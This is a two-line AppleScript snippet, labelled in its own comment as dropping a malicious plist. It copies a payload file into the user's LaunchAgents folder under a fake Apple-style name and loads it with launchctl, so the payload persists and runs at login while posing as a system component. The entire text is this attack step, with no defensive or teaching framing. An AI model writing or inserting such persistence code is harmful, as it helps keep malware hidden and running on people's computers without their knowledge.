-- Drops a malicious plist
do shell script "cp ~/payload.plist ~/Library/LaunchAgents/com.apple.fake.plist && launchctl load ~/Library/LaunchAgents/com.apple.fake.plist"
